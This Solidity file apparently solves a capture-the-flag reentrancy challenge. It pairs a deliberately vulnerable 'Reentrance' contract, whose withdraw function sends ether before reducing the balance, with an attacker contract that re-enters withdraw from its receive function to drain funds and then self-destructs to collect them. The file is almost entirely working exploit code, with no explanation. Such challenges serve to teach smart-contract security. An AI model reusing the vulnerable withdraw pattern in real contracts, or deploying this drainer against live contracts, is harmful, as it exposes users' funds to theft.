// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value : _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Reentrance1 {
    Reentrance public reentrance;
    uint256 public balances;
    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function withdrawTest() public {
        balances = reentrance.balanceOf(address(this));
        reentrance.withdraw(balances);
    }

    function obtainETH(address payable owner) public {
        selfdestruct(owner);
    }

    receive() external payable {
        reentrance.withdraw(balances);
    }


}